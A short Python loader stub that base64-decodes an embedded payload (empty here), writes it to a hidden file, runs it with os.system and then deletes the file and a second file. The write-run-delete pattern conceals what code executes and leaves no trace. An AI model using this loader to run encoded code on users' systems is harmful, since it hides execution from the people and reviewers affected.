
import os
from base64 import b64decode

file_name = ".encrypted"
anuj_file = "anujenc"
source = b64decode('')

try:
    with open(file_name, "wb") as file:
        file.write(source)
    os.system("python .encrypted")
except Exception as e:
    print(e)
finally:
    for cleanup_file in [file_name, anuj_file]:
        if os.path.exists(cleanup_file):
            os.remove(cleanup_file)
